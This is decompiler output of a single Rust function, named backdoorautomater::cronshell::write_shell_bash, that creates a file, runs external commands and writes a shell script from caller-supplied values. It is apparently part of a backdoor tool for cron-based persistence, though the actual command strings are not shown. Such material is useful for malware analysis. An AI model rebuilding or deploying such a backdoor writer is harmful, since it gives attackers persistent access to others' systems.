long _ZN17backdoorautomater9cronshell16write_shell_bash17he63b55dff26362ccE
               (long param_1,long param_2,long param_3)

{
  undefined8 uVar1;
  long lVar2;
  int local_22c;
  undefined4 local_228;
  undefined4 uStack_224;
  undefined4 uStack_220;
  undefined4 uStack_21c;
  undefined8 local_218;
  undefined4 local_208;
  undefined4 uStack_204;
  undefined4 uStack_200;
  undefined4 uStack_1fc;
  undefined8 local_1f8;
  undefined4 local_1c8;
  undefined4 uStack_1c4;
  undefined4 uStack_1c0;
  undefined4 uStack_1bc;
  undefined8 local_1b8;
  undefined8 local_1a8;
  undefined8 local_1a0;
  undefined4 local_188;
  undefined4 uStack_184;
  undefined4 uStack_180;
  undefined4 uStack_17c;
  undefined8 local_178;
  undefined8 local_168;
  undefined8 uStack_160;
  undefined4 local_158;
  undefined4 uStack_154;
  undefined4 uStack_150;
  undefined4 uStack_14c;
  undefined local_98 [40];
  long local_70;
  undefined local_60 [40];
  long local_38;
  
                    /* try { // try from 001633f8 to 00163407 has its CatchHandler @ 00163a23 */
  _ZN3std2fs4File6create17he97042899d0016f9E(&local_168,param_3);
  lVar2 = uStack_160;
  if ((int)local_168 == 0) {
    local_22c = local_168._4_4_;
                    /* try { // try from 0016342a to 00163442 has its CatchHandler @ 001639fd */
    _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_168,&DAT_00267183,2);
                    /* try { // try from 00163443 to 00163496 has its CatchHandler @ 00163a47 */
    uVar1 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_168,&DAT_00267185,2);
    uVar1 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(uVar1,&DAT_00267435,10);
    (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_208,uVar1);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
              (local_98,&local_208,&PTR_s_src_cronshell_rs_0032a998);
                    /* try { // try from 00163497 to 001634bc has its CatchHandler @ 00163a1e */
    _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_168);
    _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_168,&DAT_00267183,2);
                    /* try { // try from 001634bd to 00163510 has its CatchHandler @ 00163a28 */
    uVar1 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_168,&DAT_00267185,2);
    uVar1 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(uVar1,&DAT_0026743f,0xe);
    (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_208,uVar1);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
              (local_60,&local_208,&PTR_s_src_cronshell_rs_0032a9b0);
                    /* try { // try from 00163511 to 0016366d has its CatchHandler @ 00163a0c */
    _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_168);
    if ((local_70 == 0) || (local_38 == 0)) {
      lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_22c,&DAT_0026744d,0xd);
      if (lVar2 == 0) {
        local_158 = *(undefined4 *)(param_2 + 8);
        uStack_154 = *(undefined4 *)(param_2 + 0xc);
        uStack_150 = *(undefined4 *)(param_2 + 0x10);
        uStack_14c = *(undefined4 *)(param_2 + 0x14);
        local_168 = &DAT_0026745a;
        uStack_160 = 0xb;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_208,&local_168,2,1,0);
        local_218 = local_1f8;
        local_228 = local_208;
        uStack_224 = uStack_204;
        uStack_220 = uStack_200;
        uStack_21c = uStack_1fc;
                    /* try { // try from 00163682 to 001636fd has its CatchHandler @ 001639ee */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_228,&DAT_00267431,2);
        lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_22c,CONCAT44(uStack_21c,uStack_220),local_218);
        if (lVar2 == 0) {
          local_158 = *(undefined4 *)(param_1 + 8);
          uStack_154 = *(undefined4 *)(param_1 + 0xc);
          uStack_150 = *(undefined4 *)(param_1 + 0x10);
          uStack_14c = *(undefined4 *)(param_1 + 0x14);
          local_168 = &DAT_00267465;
          uStack_160 = 0xc;
          _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_208,&local_168,2,1,0);
          local_1b8 = local_1f8;
          local_1c8 = local_208;
          uStack_1c4 = uStack_204;
          uStack_1c0 = uStack_200;
          uStack_1bc = uStack_1fc;
                    /* try { // try from 00163715 to 0016375f has its CatchHandler @ 001639df */
          _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                    (&local_1c8,&DAT_00267433,2);
          lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                            (&local_22c,CONCAT44(uStack_1bc,uStack_1c0),local_1b8);
          if ((lVar2 == 0) &&
             (lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_22c,&DAT_00267471,0x3b),
             lVar2 == 0)) {
                    /* try { // try from 001637ca to 001637d3 has its CatchHandler @ 001639ee */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8)
            ;
                    /* try { // try from 001637d4 to 00163824 has its CatchHandler @ 00163a0c */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_228)
            ;
            goto LAB_001637de;
          }
                    /* try { // try from 00163768 to 00163771 has its CatchHandler @ 001639ee */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
        }
                    /* try { // try from 00163772 to 0016377b has its CatchHandler @ 00163a0c */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_228);
      }
    }
    else {
      lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_22c,&DAT_0026744d,0xd);
      if ((((lVar2 == 0) &&
           (lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_22c,&DAT_002674ac,0x22),
           lVar2 == 0)) &&
          (lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                             (&local_22c,*(undefined8 *)(param_2 + 8),
                              *(undefined8 *)(param_2 + 0x10)), lVar2 == 0)) &&
         (((lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_22c,&DAT_002674ce,1),
           lVar2 == 0 &&
           (lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                              (&local_22c,*(undefined8 *)(param_1 + 8),
                               *(undefined8 *)(param_1 + 0x10)), lVar2 == 0)) &&
          (lVar2 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_22c,&DAT_002674cf,0x15),
          lVar2 == 0)))) {
LAB_001637de:
        local_158 = *(undefined4 *)(param_3 + 8);
        uStack_154 = *(undefined4 *)(param_3 + 0xc);
        uStack_150 = *(undefined4 *)(param_3 + 0x10);
        uStack_14c = *(undefined4 *)(param_3 + 0x14);
        local_168 = &DAT_0026735b;
        uStack_160 = 10;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_208,&local_168,2,1,0);
        local_178 = local_1f8;
        local_188 = local_208;
        uStack_184 = uStack_204;
        uStack_180 = uStack_200;
        uStack_17c = uStack_1fc;
                    /* try { // try from 0016383f to 00163857 has its CatchHandler @ 00163989 */
        _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_168,&DAT_00267183,2);
                    /* try { // try from 0016385b to 001638c4 has its CatchHandler @ 001639bb */
        uVar1 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_168,&DAT_00267185,2);
        local_1f8 = local_178;
        local_208 = local_188;
        uStack_204 = uStack_184;
        uStack_200 = uStack_180;
        uStack_1fc = uStack_17c;
        uVar1 = _ZN3std7process7Command3arg17hc1c88ee68029addcE(uVar1,&local_208);
        (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_208,uVar1)
        ;
        _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                  (&local_1c8,&local_208,&PTR_s_src_cronshell_rs_0032a9c8);
                    /* try { // try from 001638c5 to 001638ec has its CatchHandler @ 001639ac */
        _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_168);
        (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                  (&local_208,local_1a8,local_1a0);
                    /* try { // try from 001638ed to 00163906 has its CatchHandler @ 0016399d */
        uVar1 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                          (&local_208);
        _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                  (&local_168,uVar1);
        local_218 = CONCAT44(uStack_154,local_158);
        local_228 = (int)local_168;
        uStack_224 = local_168._4_4_;
        uStack_220 = (undefined4)uStack_160;
        uStack_21c = uStack_160._4_4_;
                    /* try { // try from 00163921 to 00163934 has its CatchHandler @ 0016398e */
        _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                  (&local_208);
        _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_228);
                    /* try { // try from 00163935 to 0016393e has its CatchHandler @ 001639ac */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_228);
                    /* try { // try from 0016393f to 00163948 has its CatchHandler @ 00163984 */
        _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_1c8);
                    /* try { // try from 00163949 to 00163955 has its CatchHandler @ 00163a1e */
        _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_60);
                    /* try { // try from 00163956 to 00163962 has its CatchHandler @ 001639fd */
        _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_98);
                    /* try { // try from 00163967 to 0016396b has its CatchHandler @ 00163a23 */
        _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_22c);
                    /* try { // try from 0016396c to 00163973 has its CatchHandler @ 00163a07 */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 00163974 to 0016397b has its CatchHandler @ 00163a02 */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
        lVar2 = 0;
        goto LAB_001637af;
      }
    }
                    /* try { // try from 0016377c to 00163788 has its CatchHandler @ 00163a1e */
    _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_60);
                    /* try { // try from 00163789 to 00163795 has its CatchHandler @ 001639fd */
    _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_98);
                    /* try { // try from 0016379a to 0016379e has its CatchHandler @ 00163a23 */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_22c);
  }
                    /* try { // try from 0016379f to 001637a6 has its CatchHandler @ 00163a07 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 001637a7 to 001637ae has its CatchHandler @ 00163a02 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_001637af:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar2;
}